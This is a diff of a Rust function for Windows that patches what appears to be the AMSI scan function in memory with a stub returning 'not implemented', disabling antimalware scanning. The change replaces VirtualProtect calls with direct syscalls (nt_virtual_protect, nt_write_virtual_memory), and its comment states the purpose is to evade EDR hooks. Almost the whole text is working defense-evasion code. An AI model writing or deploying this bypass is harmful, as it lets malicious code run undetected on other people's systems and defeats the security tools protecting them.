@@ -8,7 +8,6 @@
 #[cfg(target_os = "windows")]
 pub fn patch() {
     use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
-    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};
 
     // mov eax, 0x80004001 ; ret  (E_NOTIMPL — "AMSI not implemented")
     const STUB: [u8; 6] = [0xB8, 0x01, 0x40, 0x00, 0x80, 0xC3];
@@ -23,10 +22,10 @@ pub fn patch() {
         if scan_buf.is_none() { return; }
 
         let addr = scan_buf.unwrap() as *mut u8;
-        let mut old = 0u32;
-        if VirtualProtect(addr as _, STUB.len(), PAGE_EXECUTE_READWRITE, &mut old) != 0 {
-            std::ptr::copy_nonoverlapping(STUB.as_ptr(), addr, STUB.len());
-            VirtualProtect(addr as _, STUB.len(), old, &mut old);
+        // PAGE_EXECUTE_READWRITE = 0x40 — use direct syscall to bypass EDR hook on VirtualProtect
+        if let Some(old) = super::syscall::nt_virtual_protect(addr, STUB.len(), 0x40u32) {
+            super::syscall::nt_write_virtual_memory(addr, STUB.as_ptr(), STUB.len());
+            super::syscall::nt_virtual_protect(addr, STUB.len(), old);
         }
     }
 }
